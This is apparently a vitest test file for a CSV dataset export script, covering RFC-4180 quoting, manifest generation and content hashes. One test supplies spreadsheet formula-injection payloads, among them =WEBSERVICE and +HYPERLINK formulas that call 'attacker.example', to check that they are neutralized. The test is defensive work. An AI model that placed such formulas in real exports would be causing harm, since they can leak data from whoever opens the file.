import assert from "node:assert/strict";
import { describe, test } from "vitest";
import { csvValue, toCsv, buildDatasetExports } from "../scripts/datasets.mjs";

describe("csvValue", () => {
  test("RFC-4180 quotes commas, quotes, and newlines; doubles quotes", () => {
    assert.equal(csvValue("plain"), "plain");
    assert.equal(csvValue("a,b"), '"a,b"');
    assert.equal(csvValue('he said "hi"'), '"he said ""hi"""');
    assert.equal(csvValue("line1\nline2"), '"line1\nline2"');
  });
  test("coerces null/undefined to empty and joins arrays", () => {
    assert.equal(csvValue(null), "");
    assert.equal(csvValue(undefined), "");
    assert.equal(csvValue(["a", "b"]), "a; b");
    assert.equal(csvValue(7), "7");
  });

  test("neutralizes spreadsheet formula prefixes", () => {
    assert.equal(
      csvValue('=WEBSERVICE("https://attacker.example")'),
      '"\'=WEBSERVICE(""https://attacker.example"")"',
    );
    assert.equal(
      csvValue('+HYPERLINK("https://attacker.example")'),
      '"\'+HYPERLINK(""https://attacker.example"")"',
    );
    assert.equal(csvValue("-2+3"), "'-2+3");
    assert.equal(csvValue("@SUM(1,1)"), '"\'@SUM(1,1)"');
    assert.equal(csvValue("\t=1+1"), "'\t=1+1");
    assert.equal(csvValue(["=evil", "safe"]), "'=evil; safe");
  });
});
describe("toCsv", () => {
  test("has a header row and quoted fields", () => {
    const rows = [
      { a: 1, b: "x,y" },
      { a: 2, b: null },
    ];
    assert.equal(toCsv(["a", "b"], rows), 'a,b\n1,"x,y"\n2,\n');
  });
});

describe("buildDatasetExports", () => {
  const input = {
    subnets: [
      { netuid: 7, slug: "allways", name: "Allways", categories: ["data"] },
    ],
    surfaces: [
      {
        id: "s1",
        netuid: 7,
        kind: "openapi",
        url: "https://x",
        probe: { status: "ok" },
      },
    ],
    providers: [{ id: "p1", name: "Prov", kind: "team" }],
    generatedAt: "1970-01-01T00:00:00.000Z",
    contractVersion: "2026-06-06.1",
  };

  test("emits one CSV per table and a manifest", () => {
    const { files, manifest } = buildDatasetExports(input);
    const paths = files.map((file) => file.relativePath).sort();
    assert.deepEqual(paths, [
      "datasets/providers.csv",
      "datasets/subnets.csv",
      "datasets/surfaces.csv",
    ]);
    assert.equal(
      files.every((file) => file.contentType === "text/csv; charset=utf-8"),
      true,
    );
    assert.equal(manifest.dataset_count, 3);
    assert.equal(manifest.generated_at, "1970-01-01T00:00:00.000Z");
    const subnets = manifest.datasets.find((d) => d.id === "subnets");
    assert.equal(subnets.rows, 1);
    assert.equal(subnets.path, "/datasets/subnets.csv");
  });

  test("flattens surface.probe.status and joins categories", () => {
    const { files } = buildDatasetExports(input);
    const surfacesCsv = files.find(
      (file) => file.relativePath === "datasets/surfaces.csv",
    ).body;
    assert.match(surfacesCsv, /probe_status/);
    assert.match(surfacesCsv, /ok/);
    const subnetsCsv = files.find(
      (file) => file.relativePath === "datasets/subnets.csv",
    ).body;
    assert.match(subnetsCsv, /allways/);
  });

  test("deterministic for fixed input", () => {
    assert.deepEqual(buildDatasetExports(input), buildDatasetExports(input));
  });

  test("carries published_at + a deterministic content_hash (#349)", () => {
    const hashJson = (value) => JSON.stringify(value).length.toString(16);
    const a = buildDatasetExports({
      ...input,
      publishedAt: "2026-06-12T10:00:00.000Z",
      hashJson,
    });
    assert.equal(a.manifest.published_at, "2026-06-12T10:00:00.000Z");
    assert.equal(a.manifest.content_hash, hashJson(a.manifest.datasets));
    // generated_at stays the deterministic stamp, independent of published_at
    assert.equal(a.manifest.generated_at, input.generatedAt);
    // content_hash ignores published_at — same content, same hash
    const b = buildDatasetExports({ ...input, publishedAt: null, hashJson });
    assert.equal(a.manifest.content_hash, b.manifest.content_hash);
  });

  test("published_at + content_hash default to null without injection", () => {
    const { manifest } = buildDatasetExports(input);
    assert.equal(manifest.published_at, null);
    assert.equal(manifest.content_hash, null);
  });
});
